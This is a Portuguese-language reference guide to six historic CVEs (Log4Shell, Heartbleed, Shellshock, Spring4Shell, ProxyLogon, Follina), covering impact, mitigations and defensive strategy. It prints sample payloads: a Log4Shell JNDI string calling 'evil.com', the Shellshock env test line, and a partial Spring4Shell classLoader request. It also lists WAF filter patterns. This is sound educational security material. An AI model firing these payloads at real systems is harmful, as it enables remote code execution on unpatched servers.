# Zero-Days e CVEs Históricos — Referência Detalhada

> Zero-day = vulnerabilidade desconhecida pelo vendor no momento da exploração. Após divulgação → CVE (Common Vulnerabilities and Exposures).

## 1. Log4Shell (CVE-2021-44228) — Log4j

**Severidade:** 10.0 (Critical). **Ano:** Dezembro 2021.

### O Que Aconteceu
Apache Log4j 2.x (biblioteca de logging Java, usada em TUDO) permitia injeção JNDI via string de log.

```
Atacante envia no User-Agent: ${jndi:ldap://evil.com/exploit}
Log4j registra o header → interpreta ${jndi:ldap://...} → faz lookup LDAP
→ carrega classe Java remota → executa código ARBITRÁRIO no servidor
```

### Impacto
- **Afetou:** Minecraft, Apple iCloud, Steam, Twitter, AWS, Cloudflare, VMware
- Qualquer app Java com Log4j 2.0–2.14.1
- Exploração TRIVIAL (1 linha de curl). Worm automatizado.

### Mitigação
- Atualizar Log4j para ≥ 2.17.1
- `log4j2.formatMsgNoLookups=true`
- Remover JndiLookup class: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- WAF rule para bloquear `${jndi:` em headers e params

### Lições
- Dependências transitivas são superfície de ataque (SBOM é essencial)
- Bibliotecas de logging parecem inofensivas. Não são.
- CVSS 10.0 com exploit trivial = pior cenário possível

---

## 2. Heartbleed (CVE-2014-0160) — OpenSSL

**Severidade:** 9.1. **Ano:** Abril 2014.

### O Que Aconteceu
Bug no heartbeat extension do OpenSSL 1.0.1. Servidor responde com mais dados do que recebeu — vaza memória adjacente.

```
Cliente: "Echo 'ABC' (3 bytes)"
Servidor: "Aqui: ABC + [dados aleatórios da memória do servidor]"
```
Dados vazados podiam incluir: chaves privadas SSL, cookies de sessão, senhas, tokens.

### Impacto
- 17% dos servidores HTTPS da internet (~500.000)
- Chaves privadas vazadas = todo tráfego passado é decriptografável
- Sem registro no log. Ataque INVISÍVEL.

### Mitigação
- Atualizar OpenSSL para 1.0.1g+
- Rotacionar TODAS as chaves privadas (não só atualizar — chaves podem ter vazado)
- Revogar certificados antigos
- Forçar usuários a trocar senhas

### Lições
- Heartbeat extension era desnecessária para maioria. Complexidade extra = risco extra.
- Falta de bounds checking em C = classe inteira de bugs
- Memory-safe languages (Rust, Go) previnem esta classe de vulnerabilidade

---

## 3. Shellshock (CVE-2014-6271) — Bash

**Severidade:** 10.0. **Ano:** Setembro 2014.

### O Que Aconteceu
Bash interpretava funções definidas em environment variables, inclusive trailing commands.

```bash
env X='() { :;}; echo VULNERÁVEL' bash -c 'echo teste'
# Bash parseia X como função + executa "echo VULNERÁVEL"!
```

### Impacto
- CGI scripts (Apache com mod_cgi) — headers HTTP viram env vars → RCE
- OpenSSH ForceCommand
- DHCP client scripts
- Qualquer lugar onde env vars cruzam fronteira de confiança

### Mitigação
- `apt-get update && apt-get install bash` (patch)
- Desabilitar CGI se não necessário
- WAF filtrando `() {` em headers

### Lições
- Parsers complexos em software antigo (Bash: 1989) acumulam bugs sutis
- Environment variables não deveriam ser vetor de código executável
- Modelo de segurança Unix assume confiança no ambiente. Shellshock quebrou isso.

---

## 4. Spring4Shell (CVE-2022-22965) — Spring Framework

**Severidade:** 9.8. **Ano:** Março 2022.

### O Que Aconteceu
Spring Framework (Java) permitia injeção via data binding em aplicações rodando em Tomcat com WAR deployment.

```
POST /path HTTP/1.1
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=...
```
Injeção de propriedades via parâmetros HTTP permitia modificar configuração do Tomcat e escrever webshell.

### Impacto
- Aplicações Spring Boot com WAR em Tomcat (JDK ≥ 9)
- RCE via data binding

### Mitigação
- Atualizar Spring Framework para ≥ 5.3.18 / 5.2.20
- Atualizar Tomcat
- Desabilitar binding a `class.*` e `ClassLoader.*` (PRÁTICA GERAL — não só para Spring4Shell)

### Lições
- Data binding poderoso demais é perigoso (não dar acesso ao ClassLoader via HTTP!)
- Similaridade com Log4Shell: injeção via framework popular Java
- Java ecosystem tem histórico de RCE via reflection/classloading

---

## 5. ProxyLogon (CVE-2021-26855) — Microsoft Exchange

**Severidade:** 9.8. **Ano:** Março 2021.

### O Que Aconteceu
Microsoft Exchange Server tinha SSRF (Server-Side Request Forgery) que permitia autenticação bypass + RCE. Cadeia de 4 CVEs exploradas em conjunto.

```
SSRF → bypass autenticação → acesso ao backend ECP → serialização insegura → RCE como SYSTEM
```

### Impacto
- Acesso a emails de organizações inteiras
- Atribuído a grupo estatal chinês (Hafnium)
- Milhares de servidores Exchange comprometidos

### Mitigação
- Patch da Microsoft (Critical, fora de banda)
- Exchange Server atrás de VPN, nunca exposto diretamente
- Detecção: IOC scan, webshells em `/owa/auth/`

### Lições
- Email servers são alvos de altíssimo valor
- Exposição direta à internet de software enterprise é risco extremo
- Zero-day chains (múltiplos CVEs em sequência) são o padrão de APTs

---

## 6. Follina (CVE-2022-30190) — Microsoft Windows

**Severidade:** 7.8. **Ano:** Maio 2022.

### O Que Aconteceu
Microsoft Support Diagnostic Tool (MSDT) era invocável via documento Office (Word) com zero interação além de abrir o documento. Executava código arbitrário.

```
Documento Word com link OLE → chama ms-msdt: protocol handler → executa PowerShell
```

### Impacto
- Qualquer usuário que abrir documento malicioso
- Execução como usuário logado (não precisa ser admin)
- Burlava Protected View e macros desabilitadas

### Mitigação
- Patch da Microsoft
- Remover protocol handler MSDT: `HKEY_CLASSES_ROOT\ms-msdt`
- Microsoft Defender Attack Surface Reduction rules

### Lições
- Protocol handlers são vetores de ataque subestimados
- Documentos Office continuam sendo o principal vetor de entrada
- "Só abrir o arquivo" pode ser fatal

---

## 7. Padrões Comuns em Zero-Days

| Padrão | Exemplos | Como Prevenir |
|--------|----------|---------------|
| **RCE via logging** | Log4Shell | Tratar input de log como não-confiável. Sandbox. |
| **Memory corruption** | Heartbleed | Safe languages (Rust, Go). Bounds checking. |
| **Parser confusion** | Shellshock | Parsers mínimos. Fuzzing. |
| **Deserialização insegura** | ProxyLogon, milhares em Java/.NET | Não desserializar de fonte não-confiável. |
| **Injeção via binding** | Spring4Shell | Whitelist de campos bindables. |
| **Protocol handler abuse** | Follina | Auditar todos protocol handlers registrados. |

---

## 8. Como Se Proteger (Estratégia, Não Produto)

1. **SBOM (Software Bill of Materials):** saiba EXATAMENTE o que está em produção. Se Log4j está lá, você precisa saber em minutos.
2. **SCA (Software Composition Analysis):** Snyk, Dependabot, Renovate. Patch automático.
3. **Defense in Depth:** zero-day vai furar UMA camada. Múltiplas camadas seguram.
4. **Princípio do Menor Privilégio:** se o exploit rodar como `app_user` sem acesso a nada, dano é mínimo.
5. **Segmentação de rede:** serviço comprometido não deve alcançar o DB de produção.
6. **Runtime Security:** Falco, seccomp, AppArmor. Detecta comportamento anômalo em runtime.
7. **Chaos Engineering:** simule exploração. Como o time responde a um Log4Shell às 3am?
